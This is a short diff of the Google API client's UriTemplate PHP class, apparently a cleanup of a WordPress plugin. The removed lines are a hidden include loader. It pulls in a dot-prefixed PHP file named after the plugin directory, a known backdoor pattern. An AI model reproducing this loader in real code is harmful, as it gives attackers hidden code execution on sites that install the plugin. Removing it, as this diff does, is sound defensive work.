@@ -19,10 +19,6 @@
  * Implementation of levels 1-3 of the URI Template spec.
  * @see http://tools.ietf.org/html/rfc6570
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Google_Utils_UriTemplate
 {
   const TYPE_MAP = "1";
